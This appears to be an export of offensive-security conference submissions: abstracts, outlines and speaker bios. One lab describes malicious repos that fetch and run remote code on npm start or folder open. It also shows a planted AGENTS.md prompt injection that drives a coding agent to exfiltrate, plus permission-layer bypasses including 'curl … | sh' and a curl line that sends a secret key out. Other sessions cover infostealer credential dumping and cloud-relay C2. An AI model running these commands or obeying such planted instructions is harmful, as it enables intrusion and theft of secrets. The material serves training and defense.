+Lab 1a - Execution on npm start. The repo looks like a normal Express app. A hex-encoded string in config.js decodes via Buffer.from(str,'hex') to an attacker URL. axios.get() fetches a remote snippet, which is compiled with new Function('loadModule', snippet) and handed require as loadModule - giving the fetched code full Node capability (fs, os, process, network). Attendees run it, then grep the repo and find nothing: the payload lives off-repo on the attacker's server and can change or stay dormant at will.
+
+Lab 1b - Execution on folder-open, no command run. Attendees inspect the repo first (the ""safe"" approach) and still get popped. A .vscode/tasks.json task with runOn: folderOpen fires the moment the workspace opens. We cover the real trust nuance: VS Code gates this behind Workspace Trust by default (auto-tasks disabled until Jan 2026), but forks like Cursor historically auto-fired with no prompt (Oasis disclosure, Sept 2025). We also cover the social-engineering path - urgency/authority pressure in a fake interview to get the developer to click ""Trust Folder"" themselves - and the related .vscode/settings.json (git.path, terminal.integrated.env.*) and .devcontainer/devcontainer.json (initializeCommand, postCreateCommand) execution surfaces.
+
+Anchor: Trend Micro's 2026 Void Dokkaebi reporting - 750+ infected repos, 500+ malicious tasks.json configs, DEV#POPPER RAT delivery.
+
+Module 2 - Agent harness (~60 min)Attendees drive a provided ""Claude Code""-style harness against malicious repos and harden it one stage at a time, bypassing each layer. After every round they answer three questions: what did the model request, what did the harness show, what actually ran - the three rarely match.
+
+Lab 2 - five hardening stages, each bypassed:
+
+1. No policy (yolo). Harness auto-loads AGENTS.md and pins it as a system prompt; the planted instruction tells the model to run python scripts/register.py, which exfiltrates. Real-world parallel: --yes-always, --yolo, --dangerously-skip-permissions.
+2. Per-command approval. Bypassed via a truncated approval UI - a long benign-looking command (git status ; echo '...' ; python scripts/register.py) where the malicious tail is hidden past the display limit. Parallel: early Gemini CLI (Tracebit).
+3 .First-token allowlist. curl is allowlisted; curl … | sh runs because the harness passes the full string to a shell and the pipe hijacks it.
+4. Anti-chaining (block ;, &&, |, backticks, $()). Bypassed with GTFOBins-style argument abuse inside an allowed program: find scripts/register.py -exec python {} +. No shell metacharacters needed.
+5. Allow + denylist (block exec(, os.system, subprocess., b64decode, requests.*, etc.). Bypassed without code execution at all: allowlisted curl exfiltrates the secret over HTTP (curl http://…/audit?id=$SUPER_SECRET_API_KEY).
+
+We close by mapping each bypass to a disclosed 2026 agent CVE/advisory (Claude Code, Gemini CLI, Cursor, OpenCode, Cline) and contrast the five tool-permission stages against the full defense stack a commercial harness layers on (input/output classifiers, suspicious-activity routing, sandboxing).
+
+Module 3 - Package managers (~45 min)
+
+Lab 3a - postinstall execution. Attendees build a local evil-package and run npm install ../evil-package (no registry needed, works offline). The postinstall fires with --foreground-scripts so execution is visible. The lesson: npm install is not a download - lifecycle scripts (preinstall/install/postinstall/prepare) run as your user, with your environment, before any require(), with access to ~/.npmrc, git config, and the SSH agent.
+
+Lab 3b - worm enumeration. A defanged Shai-Hulud-style simulation enumerates sibling package names (read-only - it never modifies a package.json) to show the self-propagation step: stolen NPM_TOKEN → republish the maintainer's other packages → exponential fanout. Anchored to 2026 incidents: TanStack (84 malicious versions / 42 packages, OIDC theft via pull_request_target), node-ipc reincident (>10M weekly downloads), and GlassWorm's invisible-unicode payloads shown via a cat vs xxd contrast (a file that looks empty is 1KB of code to the parser).
+
+Setup and safety
+Everything is intentionally defanged: payloads steal nothing real, contact no real server, persist nothing, and only write marker files under /tmp/labs/ inside the container to simulate exfiltration. Attendees need only Docker or Podman - the image (~800 MB) is pulled at the start, and a browser-based IDE is bundled so there's no host editor to configure. Teardown removes the image and reminds attendees to rotate any key exported during the agent lab.",,,,Michael,Chan,Senior Offensive Security Consultant @ KPMG Canada,"Michael is a social scientist turned hacker. He started by studying human behaviour and trust at Oxford - now he brings that lens into offensive security, validating and breaking the assumptions built into applications, systems, and organizations. As a Senior Offensive Security Consultant at KPMG Canada, Michael works across application security, threat modelling, and adversary simulation. Outside of work, he spends most of his time learning, building, breaking fun new tech (yes AI included), and engaging with local cyber communities.",,https://www.linkedin.com/in/michael-kh-chan/,https://hackwithmike.com,,https://cdn.sessionize.com/image/4f4d-400o400o1-XLzfe75JCCowAPPdrx2gv9.png
+Hands-On Autonomous Pentesting with Pentest Copilot,"Pentest Copilot is an MIT licensed open-source offensive security workspace built to assist operators during internal assessments.
+
+This demonstration focuses on Active Directory operations.
+
+During internal assessments, operators spend significant time reviewing BloodHound data, analyzing attack paths, identifying privilege escalation opportunities, investigating credentials, and deciding which actions are worth pursuing next.
+
+Pentest Copilot helps reduce that analysis overhead by combining attack-path data, assessment context, operator objectives, and offensive tooling into a single workspace.
+
+The demonstration will show how Pentest Copilot can assist with:
+
+- BloodHound attack-path analysis
+- Privilege escalation path identification
+- High-value target discovery
+- Credential exposure analysis
+- Lateral movement planning
+- Assessment note-taking and evidence tracking
+
+The focus of the session is practical operator workflows and how autonomous systems can assist during adversarial operations without removing the human from the decision-making process.
+
+Project: https://github.com/bugbasesecurity/pentest-copilot, 800+ GH stars
+",Adversary Tools,,,,"Introduction (3 min)
+* Why internal assessments generate more information than a human can realistically process
+* Overview of the multi-agent architecture
+* Human-in-the-loop design philosophy
+
+Initial Foothold and Situational Awareness (5 min)
+Starting from a single compromised workstation:
+* Agent receives initial context
+* Enumeration objectives are automatically generated
+* Local privilege escalation opportunities identified
+* Relevant offensive tooling selected
+* Findings stored and shared across agents
+Demonstration of how agents build an operational picture from limited initial access.
+
+Active Directory Enumeration and Attack Path Discovery (7 min)
+* SharpHound/BloodHound data ingestion
+* Relationship analysis
+* Identification of privileged groups
+* Discovery of shortest paths to Domain Admin
+* Detection of misconfigurations and privilege escalation opportunities
+
+Demonstration of how attack paths are prioritized and presented to the operator.
+
+Autonomous Offensive Operations (7 min)
+
+Agents execute and coordinate offensive workflows including:
+
+* Credential harvesting opportunities
+* Kerberoasting identification
+* AS-REP roasting opportunities
+* Delegation abuse paths
+* ACL abuse opportunities
+* Lateral movement candidate selection
+
+Discussion of how agents decide what to investigate next and how findings from one workflow influence others.
+
+Human + Agent Collaboration (4 min)
+
+* Operator reviews attack paths
+* Operator approves or redirects execution
+* Agents generate supporting evidence
+* Agents explain reasoning and proposed actions
+* Multiple attack paths compared simultaneously
+
+Demonstration of how operators remain in control while offloading analysis and prioritization.
+
+Scaling Beyond A Single Host (2 min)
+
+* Multi-host operation
+* Shared memory and findings
+* Agent coordination
+* Expanding attack surface during large internal assessments
+
+Lessons Learned (2 min)
+
+* Where autonomous analysis provides the most value
+* Failure cases encountered during development
+* Areas where human judgment remains critical
+* Future work
+",Dhruva,Goyal,"Founder, BugBase Security","Dhruva has been hacking since middle school and enjoys offensive security research and red teaming. Dhruva is certified with OSCE3(ie. OSWE, OSEP & OSED) and OSCP. He leads the cybersecurity engagements and triage team at BugBase. He also loves playing AOE4 and working out.",https://copilot.bugbase.ai,https://www.linkedin.com/in/dhruvagoyal/,https://dhruvagoyal.com,https://x.com/dhruvagoyal,https://cdn.sessionize.com/image/83d5-400o400o1-UTwHizsTMBfKhnQuZHjotG.jpg
+,,,,,,,Sitaraman,Subramanian,"BugBase, Co-founder & CTO","Sitaraman Subramanian is the CTO at BugBase. He has spent over five years working in offensive security and over a decade building products. His work spans full stack development, DevSecOps, cloud security, and offensive security. He built BugBase from the ground up, and now leads engineering on Pentest Copilot, an autonomous AI driven pentesting platform. He presented at Black Hat USA Arsenal in 2025 and Microsoft BlueHat in 2024. He is eJPT certified and a holder of the Certified AI/ML Pentester credential. He is an active open source contributor. Pentest Copilot is open sourced at https://github.com/bugbasesecurity/pentest-copilot, with 850+ stars and growing. He writes about hacking and AI evals at https://blog.ssitaraman.com.
+",https://copilot.bugbase.ai,https://linkedin.com/in/sitaraman-s,https://blog.ssitaraman.com,https://x.com/situuu_ig,https://cdn.sessionize.com/image/8fab-400o400o1-9SKgshM6o2HGyzjpyyRwR4.jpg
+Infostealer: Replicating Commodity Threat Actor Credential Theft TTPs and Validating Detection Gaps,"Commodity infostealers account for a significant share of initial access in enterprise breaches. Their TTPs are documented, their tooling is public, and most detection stacks still miss them. This workshop emulates the full infostealer playbook against a live target and measures exactly where the gaps are.
+
+Attendees execute an eight-stage adversary emulation scenario replicating documented commodity threat actor TTPs: HTA phishing delivery, in-memory C2 via Meterpreter, browser credential theft from Chrome and Edge using DPAPI and the SQLite Login Data file, in-memory keylogging via process migration to explorer.exe, UAC bypass using the fodhelper registry hijack documented across multiple threat actor profiles, and LSASS credential dumping via Kiwi/Mimikatz recovering NTLM hashes, SAM contents, and the DPAPI_SYSTEM master key. Every technique is drawn from documented threat actor behavior and mapped to MITRE ATT&CK before execution begins.
+
+The second half of the workshop shifts to validation. Attendees enable Sysmon64 telemetry and replay the emulation, stage by stage, identifying which techniques generated detectable events and which did not. Each gap maps to a concrete control recommendation. The keylogging stage writes nothing to disk. The Meterpreter session exists only in memory. The DPAPI_SYSTEM extraction is not anomalous to most SIEMs by default. Attendees document all three as validated findings, not assumptions.
+
+Key Takeaways
+1. Adversary emulation with real TTPs produces validated detection gaps, not theoretical ones. Running the actual technique against your stack tells you whether the control works. Running it in this workshop tells you before an attacker does.
+2. In-memory execution breaks file-based detection entirely. Meterpreter leaves no binary on disk. The only detection path is behavioral: process injection signals, memory scanning, or network correlation between a user-context process and an external C2 session.
+3. DPAPI_SYSTEM recovery after LSASS access retroactively compromises all protected data on the machine. Most SIEMs do not alert on this extraction by default. Attendees leave with the specific Event IDs and Sysmon rule configuration that catch it.",Workshop,"Outline
+
+Adversary emulation framing: commodity infostealer TTP landscape, ATT&CK coverage planning, emulation scenario overview 
+Stage 1 to 2: emulating HTA phishing delivery, in-memory C2 establishment, session confirmed, T1566.001, T1204.002, T1571 
+Stage 3: browser credential theft emulation, DPAPI architecture, Chrome and Edge Login Data extracted, T1555.003
+Stage 4: keylogging emulation via process migration to explorer.exe, zero disk artifacts confirmed, T1056.001
+Stage 5 to 6: privilege escalation emulation, fodhelper UAC bypass, SYSTEM access, Kiwi loaded, T1548.002 
+Stage 7 to 8: credential dump emulation, NTLM hashes, SAM, DPAPI_SYSTEM master key recovered, T1003.001, T1003.002 
+Detection validation: Sysmon64 telemetry review, gap analysis per stage, control recommendations, ATT&CK mapping finalized ",,,,Filipi,Pires,Head of Technical Advocacy,"I’ve been working as Head of Technical Advocacy at SCYTHE, Founder & Investor at CROSS-INTEL, BSides Porto Organizer, Red Team Village Director (DEF CON), Senior Advisor Raices Cyber Academy, Founder of Red Team Community (Brazil and LATAM),  AWS Community Builder, Snyk Ambassador, Application Security Specialist and Hacking is NOT a crime Advocate. International Speaker at Security and New technologies events in many countries such as US (Black Hat & Defcon), Canada, France, Spain, Germany, Poland, Black Hat MEA - Middle-East - and others, I’ve served as University Professor in Master Degree in Portugal, Graduation and MBA courses at Brazilian colleges, in addition, I'm Creator and Instructor of the Course - Malware Attack Types with Kill Chain Methodology (PentestMagazine), PowerShell and Windows for Red Teamers(PentestMagazine) and Malware Analysis - Fundamentals (HackerSec).
+
+Black Hat US 2025 - https://blackhat.com/us-25/arsenal/schedule/presenters.html#filipi-pires-46329
+Black Hat US 2024 - https://blackhat.com/us-24/arsenal/schedule/presenters.html#filipi-pires-46329
+Black Hat MEA 2025 - https://blackhatmea.com/speaker/filipi-pires-0
+Black Hat MEA 2024 - https://blackhatmea.com/speaker/filipi-pires
+DEF CON 33 / 32 - https://sessionize.com/filipi-pires/
+DEF CON - Adversary Village - https://adversaryvillage.org/adversary-events/DEFCON-33/Filipi-Pires/",https://cross-intel.com,https://www.linkedin.com/in/filipipires/,https://filipipires.com,https://twitter.com/FilipiPires,https://cdn.sessionize.com/image/8701-400o400o1-Kam8Gf5B8n4Sv8WiNa4WgC.jpg
+Hiding Infrastructure in Plain Sight,"When performing adversary emulation for training SOC analysts, incident responders and threat hunters, tools are employed within a platform to monitor the status of the attack flow and participant behaviors. For example, training providers or in-house training platforms may use computer based agents to perform activity to simulate users authenticating to a host, opening files, browsing the web, uploading and downloading files, monitoring 'flags' to determine if they were detected and removed, or an instructor may be watching user's as they participate via a remote access program.
+
+When it is time for the participants to engage in investigating the attack, they may encounter the applications that are used to perform the infrastructure tasks, such as the simulated computer use. That could potentially confuse the participant or cause them to go down rabbit holes investigating the infrastructure backend processes and not the intended processes that are part of the emulation. For instance, if they see a tool like Veyon, or TacticalRMM, they could confuse that for the attacker's tools. Rather, those could be the instructor or host monitoring their activity (Veyon) or the tool used to manage the dozens of VMs that may be employed (TacticalRMM) for the learning and training platform.
+
+One method to mitigate this issue is to have a list of what to ignore and the participants have to keep checking that list, if they remember. 
+
+I am proposing the use of ""Phantom Infra."" An eBPF program I created to hide infrastructure tasks and processes so users can focus on capturing the flags and honing their threat hunting skills and not chase rabbit holes or become confused by infrastructure processes. This allows adversary emulation activities to run with many distractions and allows the creators of the simulation to perform activities on the host to prepare and stage files for a successful simulation.
+
+This is useful and targeted for training purposes and for education based adversary emulation exercises or CTF events where users are actively logged into an OS and performing activities to learn and hunt for adversary TTPs. ",Adversary Tools,,,,"- Present the current issues of hiding infrastructure during adversary simulations. 5 minutes
+- Brief explanation of eBPF. 5 minutes
+- Demonstrate a full adversary simulation and show what the participant sees using native and well-known third-party tools to enumerate the host. 10 minutes
+- Show what the simulation looks like without Phantom Infra using the same enumeration techniques. 5 minutes
+- Conclusion. - 1 minute
+- Q&A. 4 minutes.",Duane,Dunston,Cybersecurity Training for Everyone,"Dr. Duane Dunston, EdD was a Senior Adversarial Engineer at Cloud Range where he created cyberattacks within a live range and trained corporate cybersecurity teams to identify and respond to the attacks. Duane was previously an Associate Professor of Cybersecurity at Champlain College from 2012 - 2022. He has been in Information Security since 1997 working in the education, government, and private sectors. He focuses on risk management, red and blue team training development, security education, threat intelligence, threat hunting, and using technology for social change.",,https://www.linkedin.com/in/duane-dunston-ed-d-67a151195/,,,https://cdn.sessionize.com/image/3a6e-400o400o1-RBW3fPXbPGJxdvZdsUWGe2.jpg
+"Field Notes on Offensive Agents: Reusability, Reliability, and What Breaks","Offensive agents are easy to demo, but much harder to make useful across real adversary emulation work. Key challenges lie in making agents reusable and reliable across different assessment types, tech stacks and doing so, as models, tools, and environments change.
+
+This talk shares lessons from designing, deploying, and refining a suite of modular offensive agents used in real client engagements. We will cover what made the agents reusable, where they broke against real-world complexity, and how we evaluated their effectiveness over time as prompts degraded, models drifted, and underlying tools evolved. The session is framework-agnostic and vendor-neutral.
+
+Attendees will leave with a practical model for building composable offensive agents that remain useful and reliable across attack types.",Talk,,"0–4 minutes: Framing the problem
+Why offensive agents for adversary emulation are easy to demo, but hard to make reusable, reliable, and safe in practice.
+
+4–10 minutes: Designing reusable agents
+How we built agents that can be applied across tech stacks and plug into different orchestration layers without being tied to one workflow or framework.
+
+10–15 minutes: Building portable workflows
+How we structured agents so they can support different assessment types, attack paths, and toolchains.
+
+15–22 minutes: Evaluating performance over time
+What we have found to be most impactful on agent performance and how to measure whether agents improve, regress, or behave inconsistently as models, prompts, scoring methods, and tools change.
+
+22–27 minutes: Lessons from testing
+Common failure modes, what broke in practice, and how those lessons informed better design and evaluation.
+
+27–30 minutes: Safety, takeaways, and Q&A
+Key guardrails, responsible-use considerations, and practical takeaways for framework-agnostic offensive agents.
+",,,Dominika,Pietrzak,Offensive AI Engineer,Building AI-led tooling to scale offensive security operations.,https://www.covertswarm.com/,https://www.linkedin.com/in/dominika-pietrzak-183755137/,,,https://cdn.sessionize.com/image/fe19-400o400o1-4SPhQE775fnjQhqj2ZupWw.jpg
+,,,,,,,Ibai,Castells,Senior Red Team Hive Member,"Senior Red Teamer and Red Team Capability Lead at CovertSwarm. Passionate about Windows, AD, malware dev and offensive tool engineering. Currently exploring how AI can be integrated in Red Team workflows. I drop my latest research, malware dev, and how-tos on my blog and GitHub.",https://www.covertswarm.com/,https://www.linkedin.com/in/ibai-castells/,https://kreep.in/,https://x.com/kreepsec,https://cdn.sessionize.com/image/8bfd-400o400o1-S92ra6GJDj9HKQVsSzP42x.png
+Just a TIP: DIY Your First Adversary Threat Intelligence Platform,"Several years ago, before I even knew what a ""threat intelligence platform"" was, I accidentally cobbled a TIP together with nothing but ChatGPT, Feedly, Airtable, Zapier, and duct tape vibes.
+
+That original setup was robust enough that I still use parts of it today!
+
+In this interactive, hands-on session, I'll walk you through how to hack together your first minimum viable TIP using whatever no- or low-cost tools you've got on hand.
+
+Bring an Internet-capable laptop, and we'll:
+
+* Pin down why you need a TIP: are you drowning in docs and articles, still cutting and pasting indicators, or just trying to appease the corporate gods who think it's a good idea?
+* Seed your intel feeds with customized primary sources while discovering hidden RSS feeds together.
+* Perfect your OSINT summary prompt engineering for the Gen AI bot of your choice, with a few experiments showing common failure points.
+
+You’ll walk away with war stories, a functional schematic to assemble your own TIP, and a community ready to help you iterate... no six-figure surcharge required.",Hands-on Activity,,,"# INTRO / “WHAT IS A TIP”? (15 min)
+* Intro of agenda and who everyone is, what they do, why they want to try to make a TIP (so we know who to go to for help / ideas + I know where to focus) 
+* Defining a threat intelligence platform
+  * Lists can be nested each element of TIP (= what is Threat / Intelligence / Platform in our context?)
+  * Process = Source -> Feed -> Dashboard Triage -> Automation / Metadata -> Database -> Distribution 
+* If remember nothing else:
+  * 1. Information != Intelligence
+  * 2. TIP != Information Hoard
+  * 3. Tools you already have and know > Niche “just for CTI” tools
+
+## EXERCISE No1: CHOOSE YOUR TIP (15 min)
+* Establishing minimum viable product parameters by asking who needs this and why?
+  * Story: my first TIP “failed” because I focused on what *I* thought was interesting, not what my *recipients* actually cared about.
+* Exercise: Fill in the blank TIP objective / share goals, focus together, get specific
+
+## SELECT YOUR SOURCES (10 min)
+* Differentiating between secondary & primary sources
+  * How to use secondary sources to find relevant primary sources / research over time for faster time to notice
+* Bias examples of sources (vendor, researcher, journalist, dark web) + importance of triangulation / corroboration, confidence levels)
+   * Discussion of whether dark web feeds are required for APT / direct threat research and for what purpose
+* Seed source list
+
+## EXERCISE No2: FIND YOUR FEEDS + bio break (20 min)
+* Creating / finding hidden RSS feeds by:
+  * Google Alerts
+  * View Page Source + Line Wrap + Ctrl-F [Keywords]
+  * Main Blog or Site + [Standard Extensions]
+  * Robots.txt or sitemap.xml
+* I shut up and literally let people try to find RSS feeds, periodically showing where there’s a good example or trouble spot someone has.
+* Possible feed discovery / creation tools & browser extensions
+
+## READ YOUR NEWS (5 min)
+* Walkthrough of my feed dashboard and how I process information
+* Feed collection types to “boards” for automation hook integration
+* Possible feed collection / dashboard tools
+
+## AUTOMATE YOUR INFORMATION (5 min)
+* Basic information metadata to scrape 
+  * Title, date, source, description, URL, data sensitivity labels, etc.
+* HTML metadata / schema.org intro
+* Walkthrough of my automations (basic & advanced)
+  * Making a database record
+  * What automation can do (pretty quickly) and what it could do (over time)
+* Possible automation tools
+
+## STORE YOUR DATA (5 min)
+* Walkthrough of my database
+  * Example record w/Gen AI summary
+* Possible database options
+* Write three possible custom metadata fields, based on schema.org and / or own TIP purpose, that can be used for automation
+
+## SHARE YOUR FINDINGS (10 min)
+* Walkthrough of my distribution methods (Medium + Mastodon + Email)
+* Possible distribution channels
+* Write down two possible distribution channels with template message / info formats, using identified previous metadata fields
+
+## EXERCISE No3: GENERATE YOUR AI (20 min)
+* What Gen AI CANNOT and often can do automatically
+  * Example of error
+* NEVER PUT INTERNAL DATA INTO CHATBOTS. EVER.
+* Walkthrough of my Gen AI bot “Bethany” / Extreme TLDR prompt
+  * Exercise: Hallucination Station
+    * “List 20 aliases for threat group Scattered Spider” to see it come up with realistic alternative labels mixed with real ones (or refuses to find any!)
+    * Optional variants
+      * Lower chatbot's “temperature” to 0.1 for the fewest standard deviations, rerun prompt, & compare outputs.
+      * Raise chatbot’s “temperature” to 0.9 for highest standard deviations, rerun prompt, & compare
+* Exercise: Summarization & the “Xerox Problem”
+  * Repeat the same summarization prompt / input five times with new URLs, and see how the output has deviated from Source 1 to Source 5.
+  * Demonstrates how automated AI agent issues turn into huge problems later in the process without a human in the loop (HitL)
+
+## RESOURCES AND QUESTIONS + slip (remaining time)",,A.,Stryker,Director of Threat Analysis at Fable Security,"Stryker has spent over ten years translating technical research and qualitative intelligence into the ""so what?"" and ""what now?"" materials that keep more people safe and secure. She previously produced threat intelligence across financial services, cybersecurity vendors, and now early-stage startups—including work at Ivanti, Blackpoint Cyber, and GEICO—and currently leads threat analysis at Fable Security. You can often find her playing tabletop card games after her talks at SecTor, DEF CON, and Bsides conferences around the United States. Stryker lives in Maryland, growing parsley for butterflies and algae for shrimp.",,https://www.linkedin.com/in/strykernostriking,https://www.strykernostriking.com,,https://cdn.sessionize.com/image/475f-400o400o1-V16WK2hPH7EgPbhmpYQBbG.jpg
+"“Hey Red Teamer, I’ve Got a Human EDR Bypass for You…”","Subtitle: The Scout's Field Guide to human risk telemetry: Weaponizing complacent corporate conditioning, tracking the legacy Human EDR, and surviving the wilderness.
+
+Enterprise security leadership is currently suffering from a dangerous cognitive bias: confusing compliance with operational resilience. When an organization achieves a ""1.5% phishing click-rate,"" the board celebrates under the illusion that their perimeter is secure. But to an advanced adversary, that dashboard isn't a shield it’s a deterministic roadmap of the target’s behavioral heuristics.
+
+Framed as a retro-futuristic, illustrated Scout's Field Guide, this talk exposes how advanced Red Teams and APT actors reverse-engineer corporate human risk telemetry to achieve rapid initial access without advanced code. We will dissect how standardized training inadvertently programs a rigid ""Human EDR"" based on static signatures, and how operators can fly beneath the radar by simply omitting what the user has been conditioned to look for.
+
+Furthermore, we will unlock a highly unique, unexplored exploitation vector: Behavioral Inheritance (The Legacy Human EDR). Attendees will learn how to conduct passive OSINT on a high-value target’s professional history to predict their automated reactions, weaponizing the cognitive conditioning they inherited from their previous employers to bypass structural controls during their onboarding window.
+
+Instead of chasing compliance or deploying new tools, this presentation concludes by turning offensive telemetry into zero-cost tactical defense. We will demonstrate how to evolve from static detection to pure behavioral resilience by implementing ""Interrupt Protocols"" to break an attacker's live performance, and adopting a ""No-Fault Reporting"" culture to drastically reduce adversary dwell time. We are unifying Red Team tradecraft with existing human telemetry to survive the corporate wilderness using the adversary's own playbook against them.
+",Talk,,"00:00 - 05:00 | Introduction: The Mirage of the Safe Camp & The Metric Illusion
+Visual & Conceptual Hook: Opening with the retro-futuristic visual theme. I will actively challenge the audience's perception of the ""ideal"" phishing click-rate to expose the Compliance Paradox: why a ""1.5% click-rate"" isn't a victory, but a deterministic roadmap of predictable human heuristics.
+Defining the ""Human EDR"": Explaining how continuous, rigid awareness training inadvertently configures the human mind with static detection rules. The employee is conditioned to seek specific visual signatures to fulfill their corporate duty.
+
+05:00 - 12:00 | Stage 1: The Tracking Badge (Perception OSINT & Vendor Footprinting)
+Dismantling the Black Box Fallacy: Moving away from blind social engineering toward intelligence-driven human reconnaissance.
+Mapping Defensive Firmware: A practical walkthrough of how I passively map a target’s human defense ecosystem using OSINT (public portals, historical job descriptions, and LinkedIn certifications).
+The Telemetry Exploit: Demonstrating how discovering the specific security awareness vendor used by the target grants instant access to their template library, revealing exactly which vectors are heavily ""burned"" and which cognitive blind spots remain unconditioned.
+
+12:00 - 22:00 | Stage 2: The Inheritance & Wilderness Badges (Exploiting the Perimeter Blind Spot)
+Behavioral Inheritance: Exploring the scenario of newly onboarded hires. I will reverse-engineer a target's professional legacy to map the specific cognitive conditioning implanted by their previous employers.
+The Wilderness Exploit: Shifting focus to decentralized, mobile-first personnel. I will break down how attackers trigger inherited habits of automatic obedience during high-stress windows (like onboarding).
+Execution Dynamics: Outlining the mechanics of delivering cross-channel prompts to unmanaged devices, completely evading network-level infrastructure controls to gain clean initial access.
+
+22:00 - 30:00 | Stage 3: The Ranger's Pact (Zero-Cost Tactical Mitigations & Q&A)
+Breaking the Silos (Human Grey Box Operations): Exposing the operational gap between isolated Red Teams and Security Awareness departments, proposing a unified ecosystem.
+Runtime Performance Disruption: Moving away from static detection. I will discuss the implementation of ""Interrupt Protocols,"" training users to actively break the conversational rhythm of a live, multi-channel attack using immutable verification channels.
+Minimizing Adversary Dwell Time: Concluding with the adoption of a strict ""No-Fault Reporting"" framework. Eliminating psychological shame ensures immediate telemetry delivery, killing the attacker’s window of opportunity before lateral movement occurs.
+
+Audience Q&A.",,,Daniel,Isler,Awareness & Social Engineering Consultant - Team Leader - SEK,"Daniel Isler, holds a Bachelor's degree in Performing Arts, weaponizing his background in theatrical representation, pretexting, and human behavior to reverse-engineer corporate conditioning. Active in the offensive security field since 2015, he serves as the Team Leader of Fr1endly RATs, the specialized social engineering and initial access for Red Team unit at SEK. Certified in OSINT, Red Team, and Social Engineering, he has spent nearly a decade architecting both high-fidelity tactical intrusions and enterprise Awareness service lines. His unique approach relies on a multidisciplinary, highly creative team of elite operators who strictly design and deliver educational content based on the advanced threat techniques they actively execute in the field.
+",https://dreamlab.net,https://www.linkedin.com/in/daniel-isler/,,https://twitter.com/Fr1endlyRATs,https://cdn.sessionize.com/image/72ae-400o400o1-WG6LyPMfbUrmhro2oLyJKf.png
+Microsoft and Amazon are my Favorite C2 Providers,"Cloud relay services are the perfect C2 infrastructure, and most organizations cannot block them without breaking legitimate business operations.
+
+This talk presents a comprehensive offensive analysis of three abuse vectors across Microsoft Azure and Amazon Web Services, weaponizing cloud services that enterprises depend on daily for command and control, lateral movement, and persistent access. We target Azure Relay Bridge, AWS IoT Secure Tunneling, and AWS IoT Core MQTT, services whose endpoint domains (*.servicebus.windows.net, *.iot.amazonaws.com) enterprises cannot blocklist without crippling legitimate business operations.
+
+I'll demonstrate that these are not isolated findings but instances of a repeatable pattern: cloud relay weaponization. Any cloud service that brokers connections through trusted infrastructure, requires only outbound HTTPS, and shares domains with business critical services is a candidate for C2 abuse. I'll present the methodology for identifying these services and validated attack chains for each.
+
+For Azure Relay Bridge, the attacker deploys azbridge, a legitimate Microsoft-authored, open-source tool, to tunnel arbitrary TCP traffic through Azure's relay infrastructure, appearing as standard HTTPS to *.servicebus.windows.net. It installs as a persistent system service across Windows, Linux, and macOS. The abuse here is trust in Microsoft's infrastructure and shared service domains, not a pre-existing binary on the host.
+
+For AWS IoT, I'll present two complementary techniques. First, Secure Tunneling: the attacker uses their own AWS account to create encrypted WebSocket tunnels via the officially published localproxy binary, generating no control plane API activity in the target's CloudTrail. I validated this with Sliver C2 across three protocols (mTLS, HTTPS, HTTP), but discovered operational limitations including 12 hour tunnel maximums, token rotation complexity, and IoT optimized bandwidth caps that constrain persistent C2 use. These limitations led to the second technique: weaponizing AWS IoT Core MQTT as a full C2 transport channel using X.509 mutual TLS authentication, which eliminates the tunnel lifetime and bandwidth constraints entirely.
+
+I'll also present custom Mythic C2 agents (Poseidon for Linux/macOS, Apollo for Windows) with transport profiles for both Azure Relay and AWS IoT MQTT, all end to end validated on AMD64 and ARM64. Live demonstrations showcase complete attack chains: Mythic beaconing through Azure Relay, lateral movement via IoT Secure Tunneling, and persistent C2 over IoT Core MQTT, all through traffic indistinguishable from legitimate cloud service usage.
+
+Attendees leave with released Mythic C2 agents and profiles for Azure and AWS, a framework for identifying additional cloud relay services, detection engineering guidance mapped to the Pyramid of Pain, and actionable defensive hardening for both cloud providers.",Talk,,"The Cloud Relay Pattern (~5 min)
+Core thesis: cloud relay services are the ideal C2 infrastructure: outbound-only HTTPS, cloud brokered connectivity, and domains enterprises can't blocklist without breaking business essentials. I walk through the methodology I used to systematically identify relay capable services across cloud provider catalogs and why Azure Relay Bridge and AWS IoT stood out. Prior acknowledgment to Ruben Boonen (@fuzzysecurity) whose SAFACON 2024 framework on laundering C2 through high reputation services laid the groundwork, my research takes that from theory to validated, weaponized tooling.
+
+Azure Relay Bridge (~9 min)
+I break down Azure Relay Bridge (azbridge). Microsoft-maintained, MIT-licensed, open-source, as an offensive transport. Service architecture, the full attack chain from relay namespace creation to C2 agent check in, and the LOLBin angle: this is a Microsoft-signed binary with native service persistence on Windows, Linux, and macOS. I demo (likely recorded) my custom Mythic C2 profile over Azure Relay transport: agent tasking, post-exploitation, all traffic showing up as HTTPS to *.servicebus.windows.net. Wireshark evidence woven into the demo, not a separate section.
+
+AWS IoT Two Complementary Techniques (~10 min)
+Two techniques presented as a natural progression. Starting with Secure Tunneling: tunnels created from the attacker's own AWS account, zero CloudTrail entries in the target environment, strongest audit evasion property I found across either provider. I show lateral movement with Sliver C2 integration, then get into the operational limits I hit during extended testing (12 hour tunnel lifetime, distinctive 20 second keep-alive, ~1 Mbps ceiling), so great for pivoting, not ideal for persistent C2.
+
+Those limits led me to technique two: IoT Core MQTT as a persistent C2 channel. X.509 mTLS auth, MQTT pub/sub, no tunnel lifetime restrictions. I built custom Mythic agents (Poseidon fork in Go, Apollo fork in C#) that beacon indefinitely through *.iot.amazonaws.com. Full end to end demo. The two techniques are complementary. Secure Tunneling for initial pivot, MQTT for persistence.
+
+Detection Engineering and the Defender's Dilemma (~4 min)
+I lay out the defender's problem straight: these are legitimate services, valid certs, unblockable domains, traditional controls all pass. Then I get into what actually works, organized around the Pyramid of Pain. Key detection anchors: AWS IoT's 20-second keep-alive interval, anomalous long-duration WebSocket connections to *.servicebus.windows.net, and denying iot:OpenTunnel via SCPs in accounts that don't use IoT. I flag the CloudTrail blind spot as somewhere AWS should improve visibility.
+
+Future Work (~2 min)
+Full open source release of the Mythic agents for both transports (AMD64 and ARM64 validated), translation containers, infra automation, and a complete detection rule package (Suricata, Zeek, Splunk). The cloud relay pattern extends beyond two providers, I’ll close with a call to action for the community to find and document more.",,,Robert,Pimentel,"Director, Offensive Security @ Humana, Inc. | Hacker Hermanos | Github: pr0b3r7","Robert is a seasoned offensive security professional with more than a decade of experience in Information Security. 
+He began his career in the U.S. Marine Corps, where he worked on secure telecommunications. Robert holds a master's degree in Cybersecurity, numerous IT certifications, and a background as an instructor at higher education institutions like the New Jersey Institute of Technology and American University. 
+
